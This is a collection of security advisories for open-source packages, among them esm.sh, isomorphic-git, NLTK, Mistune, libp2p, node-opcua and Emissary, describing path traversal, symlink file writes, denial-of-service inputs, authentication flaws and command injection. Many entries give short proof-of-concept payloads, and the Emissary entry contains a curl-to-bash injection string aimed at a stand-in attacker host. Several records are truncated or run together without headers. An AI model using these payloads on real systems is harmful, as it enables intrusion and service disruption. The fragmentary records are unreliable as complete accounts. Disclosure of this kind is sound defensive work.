advisories.summary: esm.sh: web.NewHandler allows arbitrary file read via encoded dot-segment path traversal
advisories.description:
### Summary

The documented `web.NewHandler` static file server can read files outside `Config.AppDir` when the request path contains URL-encoded dot-segments such as `%2e%2e`. Go's `ServeMux` redirects plain `/../` paths, but it passes encoded dot-segments to the handler after decoding `r.URL.Path`. The handler then calls `filepath.Join(s.config.AppDir, r.URL.Path)` without checking that the result remains under `AppDir`, allowing unauthenticated arbitrary file reads with the server process privileges.

### Details

`web/README.md:34-40` documents a network-facing setup:

```go
http.Handle("GET /", web.NewHandler(web.Config{
  AppDir: "/path/to/webapp",
  Fallback: "/index.html",
  Dev: false,
}))
log.Fatal(http.ListenAndServe(":8080", nil))
```

In `web/handler.go:62-75`, the handler takes `r.URL.Path` and joins it directly with `s.config.AppDir`:

```go
pathname := r.URL.Path
filename := filepath.Join(s.config.AppDir, pathname)
fi, err := os.Lstat(filename)
```

Later the same resolved filename is opened and copied to the response in `web/handler.go:150-166` for non-HTML/static files. There is no `filepath.IsLocal`, cleaned-relative-path, absolute-root prefix, or symlink-aware containment check before opening the file.

A plain `/../secret.txt` path is redirected by Go's `ServeMux`, but an encoded path such as `/%2e%2e/secret.txt` is decoded into `r.URL.Path == "/../secret.txt"` and reaches the handler. On Linux, `filepath.Join("/tmp/root/app", "/../secret.txt")` resolves to `/tmp/root/secret.txt`, outside the configured app directory.

Source-to-sink chain:

```text
Unauthenticated HTTP request path containing URL-encoded dot-segments
-> net/http decodes path into r.URL.Path
-> documented ServeMux setup passes encoded dot-segment path to web.NewHandler
-> web/handler.go joins Config.AppDir with r.URL.Path
-> os.Lstat/os.Open operate on the escaped path
-> io.Copy returns file contents to the attacker
```

False-positive checks performed:
- Plain dot-segment paths are redirected by `http.ServeMux`, but encoded dot-segments are not blocked and reach the handler.
- The PoC uses the documented `http.Handle("GET /", web.NewHandler(...))` setup, not a custom bypass of ServeMux.
- A control request for `/secret.txt` does not read the outside file; the disclosure requires encoded traversal segments.
- The issue is independent of `Dev`/HMR; it reproduces with `Dev: false`.
- The root cause appears in other handler paths that join app paths, but the static file

advisories.summary: isomorphic-git: Arbitrary file write outside of working tree via directory symlink during checkout (potential RCE)
advisories.description:
### Summary
`git.checkout` writes working-tree files through a directory **symlink** without checking the leading path, so a malicious repository can write **outside the intended working directory**. The defect is in isomorphic-git's checkout logic itself and is therefore **independent of the `fs` provider**. The *impact* depends on the configured filesystem; worst case is arbitrary file write on the host, e.g. injecting an attacker key into `~/.ssh/authorized_keys` → remote login / code execution.

### Details
A single git tree can't hold a name as both a symlink and a directory, so the attack uses two states:

```
Commit N:    config            (mode 120000, symlink → ../.ssh)
Commit N+1:  config/           (mode 040000, tree)
               authorized_keys (mode 100644, attacker public key)
```

Checking out commit N writes `config` as a directory symlink. Checking out commit N+1 sees `config/authorized_keys` as a new path: isomorphic-git `mkdir`s the parent (`config`, already a symlink → `EEXIST`, ignored) then `writeFile`s the file, which the OS resolves through the symlink to outside the working directory. A *file*-level symlink swap is caught (the `120000`→`100644` mode change triggers an `rm`), but the **directory**-level variant is not — the payload is always a new child path, a plain `create`, so the parent symlink is never removed.

The symlink target is attacker-chosen. Besides `~/.ssh`, pointing it at the repo's own control directory — `hooks → .git/hooks` then `hooks/pre-commit`, or `x → .git` then overwriting `.git/config` (`core.hooksPath` / alias / `core.fsmonitor`) — yields RCE on the next native `git` command **without** depending on `~/.ssh` existing, since `.git/` is always present in a fresh clone.

#### Canonical git behavior (divergence)
git refuses to do this: `has_symlink_leading_path()` (symlinks.c) checks each leading path component during checkout and will not follow a symlink — the hardening behind CVE-2021-21300 and CVE-2024-32002. isomorphic-git has no equivalent check.

### PoC
`https://github.com/spiceoverflow/av1-symlink-hook-rce` — open in a Codespace; it builds the malicious repo, serves it locally, and runs a victim. Output on Linux:

```
[AV-1] Directory symlink on disk: …/config → ../.ssh  (→ /home/node/.ssh)
[AV-1] *** SSH KEY INJECTION CONFIRMED ***
```

### Summary
DependencyGraph.tree()/triples() walk the parsed dependency structure using plain, unbounded Python recursion — one stack frame per edge in the graph — and never use the class's own cycle detector. A crafted dependency-parse file with a few thousand chained tokens (an entirely ordinary-looking long sentence) crashes the process with an unhandled RecursionError the moment .tree() or .triples() is called — which is NLTK's own documented usage pattern immediately after loading such a file.

`DependencyGraph._tree()` (~lines 393-406), `.tree()` (~408-417), and `.triples()` (~419-432) in `nltk/parse/dependencygraph.py` rebuild/walk the graph with `Tree(word, [self._tree(dep) for dep in deps])` and `yield from self.triples(node=dep)` — ordinary recursive calls, one per edge, with no depth check. `contains_cycle()` is defined on the class (~line 447) but is never invoked by any of these three methods.

This is exactly the CWE-674 pattern the project has already identified and fixed elsewhere: `nltk/tree/tree.py` adds `MAX_TREE_DEPTH = 500` with a comment stating that an arbitrarily deep tree would make every traversal raise RecursionError, and `nltk/test/unit/test_recursion_dos.py` locks in the identical fix for `FeatStructReader`, `LogicParser`, and `ResolutionProver`. But `DependencyGraph` builds its `Tree` objects **programmatically** (`Tree(word, [...])`), which bypasses `MAX_TREE_DEPTH` entirely — that guard only fires inside `Tree.fromstring()`'s bracket-string parser, never in `Tree.__init__`. `DependencyGraph`'s own recursive walk has no depth limit of its own.

advisories.summary: NLTK: Compile-time regex DoS in NLTK search/tokenizer sinks: quadratic regex-engine compile bypasses the match-only timeout
advisories.description:
## Summary

NLTK exposes a compile-time regular-expression denial of service in its regex-search helpers. When an application passes untrusted text as the search pattern to `TokenSearcher.findall()` / `Text.findall()`, or as the tokenizer pattern to `RegexpTokenizer`, the pattern is handed to the third-party `regex` engine, whose compilation cost is roughly quadratic in the number of capturing groups. A short pattern of the form `()` repeated many times (for example `"()" * 25000`, about 50 KB) forces tens of seconds of synchronous CPU work before any match begins. The wall-clock timeout that NLTK added to guard matching does not apply during compilation, so a single small request pins a CPU core, and repeated or concurrent requests exhaust all cores and deny service.

## Root Cause

The remediation for the earlier match-time backtracking issue (advisory GHSA-rrv8-h7p8-rx55 / CVE-2026-80205) switched the caller-supplied-pattern search path from the standard library `re` module to the third-party `regex` engine and wrapped matching in a wall-clock timeout. That timeout is a match-time limit only: it is applied while the compiled pattern scans the corpus. Compilation of the pattern happens first and synchronously, outside any timeout. The `regex` engine's compiler is approximately O(n^2) in the number of regex groups, so a caller-controlled pattern consisting of many empty groups makes compilation, not matching, the expensive step. No control bounds the group count of a caller-supplied pattern before compilation.

```text
Affected components / functions:
- nltk.text.TokenSearcher.findall  (nltk/text.py)  -> regex.findall(pattern, corpus, timeout=...)
    On released 3.10.0-3.10.2 this sink calls regex.findall directly; on 3.10.3 and later it
    routes through nltk.redos.compile. Either way the regex engine compiles the caller pattern
    with no group-count bound, and the timeout guards only matching.
- nltk.redos.compile  (nltk/redos.py, introduced in 3.10.3)  -> regex.compile(src, flags)
    Called synchronously before the timeout-bearing wrapper exists. On released 3.10.3 there is
    no pre-compile guard at all; on the current development tree a check_pattern bounds source
    length, nesting depth, and counted-repeat product, but not the number of groups.
```

advisories.summary: Natural Language Toolkit (NLTK): Uncontrolled recursion (crash DoS) in Synset.tree()/acyclic_tree() via WordNet relation traversal
advisories.description:
### Summary
The recursive traversal engines behind WordNetCorpusReader's Synset.tree() and Synset.acyclic_tree() have no maximum call-depth safeguard and default to unlimited depth. They guard against literal cycles, but not against a long, genuinely acyclic relation chain — which exhausts the Python call stack the same way as the sibling DependencyGraph finding I reported separately. Real-world exploitability requires the host application to load a custom/foreign WordNet-format lexical resource rather than NLTK's bundled default corpus — flagging that narrower scope honestly up front since it affects severity, not validity.

### Details
`nltk/util.py`'s `acyclic_depth_first()` (~lines 471-541) and `acyclic_branches_depth_first()` (~lines 544-625) recurse once per graph edge, default to `depth=-1` ("unlimited"), and guard against re-visiting the same node via an explicit `traversed` set (hence "acyclic") — but that set only prevents literal cycles, it never bounds how many *distinct* nodes a single call chain may pass through before returning.

`Synset.tree(rel, depth=-1)` (`nltk/corpus/reader/wordnet.py`, ~line 664) calls the recursive `acyclic_branches_depth_first`. There is also a third, easy-to-miss method: `Synset.acyclic_tree()`, a vestigial class-attribute alias for `acyclic_depth_first` — also genuinely recursive and vulnerable.

**Important correction to an earlier draft of this finding:** `Synset.closure(rel, depth=-1)` (~line 609) does **not** share this bug — it actually calls `acyclic_breadth_first()`, a completely different, iterative queue/deque-based function with no recursion at all. I verified this directly: feeding both `acyclic_breadth_first` and the real `Synset.closure()` a 20,000-node genuinely-acyclic chain produces zero crash, while `acyclic_depth_first`/`acyclic_branches_depth_first`/`Synset.tree()`/`Synset.acyclic_tree()` crash reliably at ~1000-1500 nodes on the identical data. Only `.tree()` and `.acyclic_tree()` are affected — not `.closure()`.

advisories.summary: Mistune: Quadratic-time DoS in inline image parsing (precedence_scan) bypasses not-is-image guards
advisories.description:
## Resolution

**Fixed in Mistune 3.3.4.** Upgrade to 3.3.4 or later.

- Affected versions: `< 3.3.4`
- First patched version: `3.3.4`
- Fix: https://github.com/lepture/mistune/compare/v3.3.3...v3.3.4

The reported payload was reproduced against the 3.3.3 release tag and verified to scale approximately linearly against the 3.3.4 release tag.

## Original report

The following report describes the issue before the fix.

## Summary
mistune's inline image parsing reaches `precedence_scan` for `![` openers because the two guards that keep the link path linear are both gated behind `not is_image`. A small default-renderer document of the form `"![" * N + "x" + "]" * N` produces O(N²) CPU with no plugins.

## Root Cause
For `![` openers, `is_image` is True, so both linearizing guards are skipped: `if not is_image and pos <= state.no_link_before` (inline_parser.py:141) and `has_nested_link = not is_image and _label_contains_link(...)` (:171). Execution reaches `precedence_scan` (:179) which runs `sc.search(state.src, mark_pos, end_pos)` over the whole image body — O(n) per outer opener, x O(n) openers -> O(n²). `max_image_depth` never fires because the failing scans never produce an image token (`image_depth` stays 0).

## Impact
A single unauthenticated request pins a worker at 100% CPU. Measured on default `mistune.html`, no plugins: 6KB->0.28s, 12KB->1.07s, 24KB->4.20s, 48KB->15.8s (2x input -> ~3.8x time).

## Proof of Concept
```python
import mistune
md = mistune.create_markdown()   # default, no plugins
md("![" * 16000 + "x" + "]" * 16000)
```

## Attack Chain
1. Entry: rendered markdown -> `"!["*N + "x" + "]"*N` (no plugins). Guard: none on input size. Bypass proof: no global cap.
2. Check: `not is_image` guards at inline_parser.py:141 (`no_link_before`) and :171 (`_label_contains_link`). Guard: high-water mark + nested-link short-circuit. Bypass proof: `is_image` is True for `![`, so BOTH guards are gated out; `max_image_depth` (:checked after) measured flat across all values because no image token is produced.
3. Processing: reaches `precedence_scan` (:179) -> `sc.search(state.src, mark_pos, end_pos)` over the full body per opener.
4. Sink: O(N) openers x O(N) scan -> O(N²) CPU.
5. Impact: 48KB -> ~16s single-threaded worker stall.

- The LINK payload `"["*n+"x"+"]"*n` is LINEAR on HEAD (0.076s @ 16k, ~2x per 2x) because links get the `_label_contains_link` short-circuit; the IMAGE payload `"!["*n+"x"+"]"*n` is O(n²) (0.27->1.05->3.92s

advisories.summary: Action Pack: Possible Strong Parameters Bypass in Parameters#each_key
advisories.description:
### Impact
`ActionController::Parameters#each_key` delegates to the internal `ActiveSupport::HashWithIndifferentAccess` that holds the request parameters, so when called with a block it returns that hash instead of the `Parameters` instance. The hash does not respond to `permitted?`, so Active Model mass assignment (`new`, `assign_attributes`, `update`) accepts it without raising `ActiveModel::ForbiddenAttributesError`. An application that passes the return value of `each_key` to mass assignment could allow a remote, unauthenticated attacker to set attributes that the application does not permit, such as an authorization flag.

This is an incomplete fix of [CVE-2020-8164](https://github.com/advisories/GHSA-8727-m6gj-mc37), which made `each`, `each_pair` and `each_value` return the `Parameters` instance but left `each_key` delegated.

### Details
The fixed releases define `Parameters#each_key` to yield each key and return the `Parameters` instance when given a block, as `each`, `each_pair` and `each_value` do, and to return an `Enumerator` without one. Code that used the return value of `each_key` as a hash now receives the `Parameters` instance, which mass assignment rejects unless it is permitted.

### Affected applications
An application is affected if it passes the return value of `ActionController::Parameters#each_key`, called with a block, to mass assignment. Rails itself makes no such call.

### Workarounds
Do not use the return value of `each_key`. Call it for its block only, and pass the permitted `Parameters` instance to mass assignment.

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/8ba746e0a786458c281060823f2ccc5c5f6312ac.patch
- 8.0: https://github.com/rails/rails/commit/2fc8838300133931e19eed3ea6cee76a7e83f19c.patch

### Versions affected
- actionpack < 8.0.5.2
- actionpack >= 8.1, < 8.1.4.1

### Credit
This issue was responsibly reported by HackerOne researcher [smlee](https://hackerone.com/smlee).

advisories.summary: Effect: Cookie attribute injection via domain, path, and name fields in @effect/platform makeCookie()
advisories.description:
### Impact

The `name`, `domain`, and `path` fields of `makeCookie()` were validated with a regex that allows `;`, the attribute separator in `Set-Cookie` headers. Because `serializeCookie()` writes those fields verbatim, a caller who passes untrusted input into any of them can append arbitrary attributes to the header.

For example, a `domain` of `"legit.com; Domain=.parent.tld"` serializes to `session=token; Domain=legit.com; Domain=.parent.tld`. RFC 6265 §5.3 takes the last occurrence, so the injected domain wins and the cookie widens to the parent domain. The same trick sets `SameSite=None` or `Max-Age` when the caller has not set those options itself.

The `value` field is unaffected: it passes through `encodeURIComponent`, which encodes `;`. CR and LF are rejected by the existing regex, so header splitting is not possible.

### Patches

Fixed in #6763 (v4) and #6765 (v3): the shared regex is split into per-field validators that reject `;`, and `serializeCookie()` now validates before writing the header.

### Workarounds

Do not pass user input into `name`, `domain`, or `path`; set them from application constants.

advisories.summary: Poweradmin: The email second factor is an mt_rand() six-digit code verified with no attempt limit or lockout, so an attacker holding the password can brute-force it within the validity window
advisories.description:
### Summary

The email second factor is an mt_rand() six-digit code verified with no attempt limit or lockout

The email second factor is a six-digit code drawn from `mt_rand()` and verified with no attempt limit, so an attacker who already has the password can brute-force it inside its validity window.

`lib/Domain/Service/MfaService.php`, in `generateEmailVerificationCode()`:

```php
$numericCode = mt_rand(100000, 999999);
```

That is a 900,000-value space, and `mt_rand()` is a Mersenne Twister rather than a CSPRNG, so it is not appropriate for a security token in the first place. PHP provides `random_int()` for exactly this.

The bigger problem is that nothing limits guesses. `lib/Application/Controller/MfaVerifyController.php` calls:

```php
$isValid = $this->mfaService->verifyCode($userId, $code);
```

and on failure the only action taken is:

```php
$this->logger->warning('[MfaVerifyController] Verification failed for user ID: {user_id}', ['user_id' => $userId]);
```

I grepped that controller for any counter, lockout, throttle or rate limit and found nothing beyond log statements. So an attacker holding valid credentials submits codes until one lands. Against 900,000 values with no ceiling on attempts, the only thing standing in the way is the code's validity window and however fast requests can be issued.

That defeats the purpose of the second factor: it is meant to hold even when the password is known, and here it reduces to a race the attacker is likely to win with sustained requests.

Two separate fixes, and I would treat the second as the urgent one:

1. Generate the code with `random_int(100000, 999999)` so it is not predictable from RNG state.
2. Enforce a failed-attempt counter tied to the user and the pending MFA session, invalidating the code and requiring a fresh one after a small number of wrong guesses, plus a per-account and per-IP rate limit on the verify endpoint.

Scope: source-verified at `master`. I confirmed the generator, the verify call site, the log-only failure handling and the absence of any throttling construct in that controller. I did not stand up a Poweradmin instance and run a brute-force against a live code, so the rate at which the space can be covered in practice is not something I measured. If throttling is applied at a layer I did not look at, such as a web-server or reverse-proxy rule shipped with your deployment docs, then the second half of this weakens considerably and I would want to know that.

advisories.summary: libp2p: gossipsub creates a permanent topics-map entry per distinct subscription with no cap in the default config
advisories.description:
### Summary
A single gossipsub peer can grow a node's `topics` map without bound by flooding subscription RPCs, because the default configuration has no global, per-peer, or topic-length cap and peer scoring does not penalise subscription volume. The peer is never greylisted, so the growth continues toward OOM.

### Details
`handleReceivedSubscription` (`packages/gossipsub/src/gossipsub.ts:1028`, line 1036) runs `this.topics.set(topic, new Set())` for every distinct topic string:

```ts
private handleReceivedSubscription (from, topic, subscribe) {
  let topicSet = this.topics.get(topic)
  if (subscribe) {
    if (topicSet == null) {
      topicSet = new Set()
      this.topics.set(topic, topicSet)   // no global cap, no per-peer cap
    }
    topicSet.add(from.toString())
  }
}
```

The only topical gate (`gossipsub.ts:981`, `if (this.allowedTopics != null && !this.allowedTopics.has(topic)) return`) is skipped when `allowedTopics` is null — the default. Subscriptions are unsigned RPC metadata (no signature needed); `decodeRpc`'s per-RPC limit caps count (`maxSubscriptions = 5000`) but not topic-string length or aggregate size; and the peer-scoring components P1–P7 have no subscription-volume term, so the attacker's score stays at 0 (above the `graylistThreshold` of −80) and `acceptFrom` keeps returning true. Verified on js-libp2p commit `a04f5e0`, where `@libp2p/gossipsub` reads `16.0.4`.

### PoC

### Summary
A remote peer can stall a js-libp2p node's entire event loop for ~4–5 seconds per connection (and transiently allocate ~2 GB) by sending a ~15-byte crafted `publicKey` inside an Identify message. The malformed key reaches the DER decoder before any peer-id/signature check, so the attack is pre-auth and repeatable indefinitely by reconnecting.

### Details
`packages/crypto/src/keys/rsa/der.ts` `readLength()` parses DER long-form lengths with no comparison to `buf.byteLength`, and `readInteger()` then loops over the attacker-claimed length:

```ts
function readInteger (buf, context) {
  const length = readLength(buf, context)   // attacker-controlled, claims up to 2^64
  const end = context.offset + length
  for (let i = context.offset; i < end; i++) // runs far past buf.byteLength
    vals.push(buf[i])                         // pushes `undefined` past the end
}
```

The blob reaches the parser pre-auth: Identify runs on every `connection:open` and calls `publicKeyFromProtobuf(publicKey)` (`packages/protocol-identify/src/identify.ts:85`) before the `connection.remotePeer.equals(id)` check at `identify.ts:88`. The `MAX_RSA_JWK_SIZE` guard in `pkixToRSAPublicKey` only bounds the total blob size, not the inner length field, so a 15-byte payload defeats it; the ECDSA path (`unmarshalECDSAPublicKey`) has no cap at all. The decode runs in a single synchronous tick, so no `AbortSignal` — including Identify's 5 s timeout — can interrupt it. Verified on js-libp2p commit `a04f5e0`, where `@libp2p/crypto` reads `5.1.21`.

### PoC
Full PoC attached (`libp2p-crypto-der-eventloop-dos-poc.tar.gz`). Build the js-libp2p monorepo at the affected version (`npm install --ignore-scripts && npm run build`), extract the package inside the monorepo root (sibling of `packages/`), then `cd libp2p-crypto-der-eventloop-dos-poc && node attack.mjs`. ```
[*] round 1: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[*] round 2: payload sent=true, victim event-loop stall = 4-5s, peak RSS ~1980 MB
[*] round 3: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[!] Vulnerability reproduced: 3/3 connections each stalled the victim's event loop for ~4-5s — one crafted ~15-byte Identify publicKey per connection, pre-auth
```

The stall is measured from the victim's own 1 s heartbeat clock (frozen while the loop is blocked); the ~2 GB transient RSS peak is read from `/proc/<pid>/status`. The DER `RangeError` is swallowed by Identify's `.c

advisories.summary: Sentry's improper authentication on SAML SSO process allows user identity linking
advisories.description:
### Impact
A critical vulnerability was discovered in the SAML SSO implementation of Sentry. It was reported to us via Sentry's private bug bounty program.

The vulnerability allows an attacker to take over any user account by using a malicious SAML Identity Provider and another organization on the same Sentry instance. The victim email address must be known in order to exploit this vulnerability.

Self-hosted users are only vulnerable if the following conditions are met:
- They have more than one organization configured (SENTRY_SINGLE_ORGANIZATION = False).
- A malicious user has existing access and permissions to modify SSO settings for another organization in their multi-organization instance. 

### Patches
- [Sentry SaaS](https://sentry.io/): The fix was deployed in April. No action is required.
- [Self-Hosted Sentry](https://github.com/getsentry/self-hosted): If only a single organization is allowed (SENTRY_SINGLE_ORGANIZATION = True), then no action is needed. Sentry recommends upgrading to version 26.4.1 or higher.

### Workarounds
User account-based two-factor authentication prevents an attacker from being able to complete authentication with a victim's user account. Organization administrators cannot do this on a user's behalf, this requires individual users to ensure 2FA has been enabled for their account.

Users can manage their two-factor authentication settings through Account Settings > [Security](https://sentry.io/settings/account/security/) page. For step-by-step details, please see the Sentry [helpdesk article](https://sentry.zendesk.com/hc/en-us/articles/46773315774235-How-do-I-enable-two-factor-authentication-2FA-on-my-Sentry-account).

### Resources

- https://github.com/getsentry/sentry/pull/113720 

Please note that this is distinct vulnerability from the similar https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w from 2025.

advisories.summary: NLTK: Symlink escape in YCOECorpusReader lets a psd/pos directory symlink read files outside the corpus root within the data sandbox
advisories.description:
## Summary

`YCOECorpusReader` builds two nested corpus sub-readers whose roots are derived from `self.root.join("psd")` and `self.root.join("pos")` (nltk/corpus/reader/ycoe.py). Because `FileSystemPathPointer.join()` (nltk/data.py) performs a purely lexical containment check and never resolves symlinks, and because `CorpusReader.__init__` (nltk/corpus/reader/api.py) validates a sub-reader root only against the global NLTK data sandbox and not against the enclosing corpus root, a directory symlink named `psd` or `pos` planted inside a YCOE corpus lets the reader anchor its nested sub-readers outside the YCOE corpus root. An attacker who controls the contents of a YCOE corpus loaded under `pathsec.ENFORCE=True` can make `parsed_sents()`, `tagged_words()`, and related methods return file content from other locations inside the allowed data sandbox, defeating the per-corpus-root containment boundary the pathsec controls are meant to enforce.

## Root Cause

NLTK's pathsec controls are designed to keep each corpus reader confined to its own corpus root. The scoped containment is enforced through `validate_path(..., required_root=self._root)` at read time. However, the containment invariant is violated at reader-construction time for nested readers:

- `FileSystemPathPointer.join()` accepts a component that is a directory symlink because it only checks the joined string lexically (`os.path.normpath` plus a `startswith` prefix test) and never calls `resolve()`.
- `CorpusReader.__init__` validates the resulting sub-reader root string, but calls `validate_path` without `required_root`, so only the global-sandbox layer runs; the scoped per-corpus-root layer is skipped. The symlink is resolved by that global check, its target is found to be inside the allowed sandbox, and the sub-reader is accepted with its root pointing at the escaped target.

From that point every read the sub-reader performs is scoped to the already-escaped root, so no later guard re-anchors it to the YCOE corpus root.

```text
Affected functions:
- nltk.corpus.reader.ycoe.YCOECorpusReader.__init__   (nltk/corpus/reader/ycoe.py) builds nested sub-readers from self.root.join("psd")/("pos") without containing them to the parent root
- nltk.corpus.reader.api.CorpusReader.__init__        (nltk/corpus/reader/api.py) validates a sub-reader root only against the global sandbox (validate_path without required_root)
- nltk.data.FileSystemPathPointer.join               (nltk/data.py) applies a lexical pref

### Summary

An unauthenticated attacker can inject arbitrary SQL through the `sort` query parameter accepted by

blind/error-based extraction of data from tables the requester has no permission to read.

`PaginatedFindAllWithoutFilters` in `server/resource/resource_findallpaginated.go` reads the `sort`
query parameter directly from the request with no validation:

```go

    sortOrder = req.QueryParams["sort"]
```

Each entry is then concatenated with the table name and passed to `goqu.I()` (goqu's raw SQL
*identifier* constructor) in two separate places, with no check that the referenced column exists
on the table:

```go

    ...
    if strings.Index(sort, "(") == -1 {

advisories.summary: mail-parser: Path Traversal vulnerability in attachment extraction
advisories.description:
A path traversal vulnerability was identified in mail-parser when extracting email attachments using the write_attachments() and write_sample() APIs.

A specially crafted email containing malicious attachment filenames (for example, using directory traversal sequences such as "../" or absolute filesystem paths) could cause files to be written outside the intended output directory. Depending on how the library was used and the permissions of the executing process, this could result in arbitrary file overwrite.

The vulnerability affects mail-parser versions 3.8.0 through 4.5.0.

The issue has been addressed by introducing comprehensive filename sanitization and path validation before any file is written to disk. The fix includes:

- Sanitization of attachment filenames before writing.
- Validation that all output paths remain within the intended destination directory.
- Rejection of symbolic link targets.
- Normalization of Windows and POSIX path separators.
- Validation and rejection of invalid or unsafe filenames.
- Protection applied consistently in both write_attachments() and write_sample() APIs.

Users are strongly encouraged to upgrade to the patched release.

## Credits

The vulnerability was responsibly reported by **Niranjan Ganesan** (Security Insights, https://securityinsights.io/, GitHub: @iam-niranjan).

The vulnerability was analyzed, remediated, and the security fix was implemented by **Fedele Mantuano**, maintainer of mail-parser (LinkedIn: https://www.linkedin.com/in/fmantuano/).

mail-parser would like to thank Niranjan Ganesan for following a coordinated vulnerability disclosure process and for collaborating throughout the remediation and verification of the fix.

advisories.summary: node-opcua: Namespace-Level RBAC Fail-Open - Anonymous Write/Call Bypass via Unbound `DefaultRolePermissions
advisories.description:
## Summary

An unauthenticated (**Anonymous**) client can **Write** protected Variables and **Call** privileged Methods on any Node that lacks explicit per-node permissions.

This follows the inheritance model defined by OPC UA Part 3, §5.2.9, where nodes without an explicit `RolePermissions` attribute inherit the namespace `DefaultRolePermissions`. OPC 10000-3 §4.8.3 mandates a **default-deny** evaluation (`Bad_UserAccessDenied` when the operation bits are not set); `node-opcua` instead **grants all permissions**.

The root cause is a combination of an authorization **fail-open** and a **disconnect** between the configuration API and the runtime enforcement path.

---

## Affected configuration
This advisory covers two cases that are not equally severe:
1. No RolePermissions declared anywhere - resolution is permissive. This is node-opcua's documented behaviour for a server with no access control configured, so nothing is being bypassed. Worth fixing as an insecure default (CWE-1188), but it is not the 9.1 bypass. Stock Opc.Ua.NodeSet2.xml ships DefaultRolePermissions with no Value, so a server that declared no policy is NOT exposed.
2. A policy is declared and silently ignored - setDefaultRolePermissions() succeeds and does nothing, so an operator who believes they locked the namespace down has not. This is the real bypass and this is what earns CVSS 9.1. It requires that someone declared a namespace default.
Everything below describes case 2 unless stated otherwise.


## Root Cause Analysis

### Bug 1 - `getPermissionForRole(null)` returns `allPermissions` (violates §4.8.3 default-deny)

File: `packages/node-opcua-address-space/source/session_context.ts:151-153`

```ts
function getPermissionForRole(rolePermissions: RolePermissionType[] | null, role: NodeId): PermissionFlag {
    if (rolePermissions === null) {
        return allPermissions; // null means "grant everything" to ANY role, including Anonymous
    }
```

When the applicable policy resolves to `null`, the function returns `allPermissions` (Read, Write, Call) to whichever role is checking permissions, **including Anonymous**. OPC 10000-3 §4.8.3 requires the opposite: *"If they are not set the Server returns `Bad_UserAccessDenied`."*

### Bug 2 - The namespace default resolves to `null` on the enforcement path

The runtime enforcement reads the `DefaultRolePermissions` / `DefaultUserRolePermissions` Variable nodes under `Server/Namespaces/<ns>`. These resolve to `null` in every reachable config

advisories.summary: Emissary has a Command Injection via PLACE_NAME Configuration in Executrix
advisories.description:
## Summary

The `Executrix` utility class constructed shell commands by concatenating
configuration-derived values — including the `PLACE_NAME` parameter — with
insufficient sanitization. Only spaces were replaced with underscores, allowing
shell metacharacters (`;`, `|`, `$`, `` ` ``, `(`, `)`, etc.) to pass through
into `/bin/sh -c` command execution.

## Details

### Vulnerable code — `Executrix.java`

**Insufficient sanitization (line 132):**
```java
this.placeName = this.placeName.replace(' ', '_');
// ONLY replaces spaces — shell metacharacters pass through
```

**Shell sink (line 1052–1058):**
```java
protected String[] getTimedCommand(final String c) {
    return new String[] {"/bin/sh", "-c", "ulimit -c 0; cd " + tmpNames[DIR] + "; " + c};
}
```

### Data flow

1. `PLACE_NAME` is read from a configuration file
2. `Executrix` applies only a space-to-underscore replacement
3. The `placeName` is used to construct temporary directory paths (`tmpNames[DIR]`)
4. `tmpNames[DIR]` is concatenated into a shell command string
5. The command is executed via `/bin/sh -c`

### Example payload

```
PLACE_NAME = "test;curl attacker.com/shell.sh|bash;x"
```

After the original sanitization: `test;curl_attacker.com/shell.sh|bash;x`
(semicolons, pipes, and other metacharacters preserved)

### Impact

- Arbitrary command execution on the Emissary host
- Requires the ability to control configuration values (e.g., administrative
  access or a compromised configuration source)

## Remediation

Fixed in [PR #1290](https://github.com/NationalSecurityAgency/emissary/pull/1290),
merged into release 8.39.0.

The space-only replacement was replaced with an allowlist regex that strips all
characters not matching `[a-zA-Z0-9_-]`:

```java
protected static final Pattern INVALID_PLACE_NAME_CHARS = Pattern.compile("[^a-zA-Z0-9_-]");

protected static String cleanPlaceName(final String placeName) {
    return INVALID_PLACE_NAME_CHARS.matcher(placeName).replaceAll("_");
}
```

This ensures that any shell metacharacter in the `PLACE_NAME` configuration
value is replaced with an underscore before it can reach a command string.

Tests were added to verify that parentheses, slashes, dots, hash, dollar signs,
backslashes, quotes, semicolons, carets, and at-signs are all sanitized.

## Workarounds

If upgrading is not immediately possible, ensure that `PLACE_NAME` values in all
configuration files contain only alphanumeric characters, underscores, and hyphens.

advisories.summary: NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains
advisories.description:
## Summary

The public CCG lexicon parser `nltk.ccg.lexicon.fromstring` parses caller-influenced lexicon text with two pure-Python loops whose cost is quadratic in the input width. A service that parses an untrusted CCG lexicon string can be driven into tens of seconds of single-threaded CPU by a few-megabyte input, starving the request worker. No authentication or user interaction is required.

## Root Cause

`matchBrackets` consumes a bracket body one character at a time with `inside = inside + rest[0]; rest = rest[1:]`. The `rest = rest[1:]` tail re-slice copies the entire remaining string on every iteration, so a flat bracket body costs O(n^2). `augParseCategory` drives a `while rest != "":` operator loop that re-copies the regular-expression match tail (`rest = app[3]`) once per operator, which is also O(n^2) over a long operator chain. The parser carries a recursion-depth guard (`MAX_PARSE_DEPTH = 500`) that raises on deeply nested categories, but both quadratic loops run on flat input whose nesting depth stays at zero, so that guard never fires. No bound is applied to line length or category width before the text reaches these loops.

```text
Affected functions:
- nltk.ccg.lexicon.matchBrackets       (nltk/ccg/lexicon.py:149-172; tail re-slice at line 168)
- nltk.ccg.lexicon.augParseCategory    (nltk/ccg/lexicon.py:223-268; APP_RE tail re-copy at line 250)
Public entry point: nltk.ccg.lexicon.fromstring (nltk/ccg/lexicon.py:271), also re-exported as nltk.ccg.chart.fromstring.
```

## Impact

An attacker who can influence the CCG lexicon string parsed by an application causes sustained single-threaded CPU consumption (availability loss). The vulnerable path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with attacker-chosen input size, a few-megabyte payload costs tens of seconds per core, and a small number of concurrent requests can exhaust worker threads. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only; it does not wrap these pure-Python slicing loops, so it provides no protection here.

advisories.summary: NLTK: Quadratic-time CPU denial of service in Tree.chomsky_normal_form right-factor binarization via list.pop(0)

## Summary

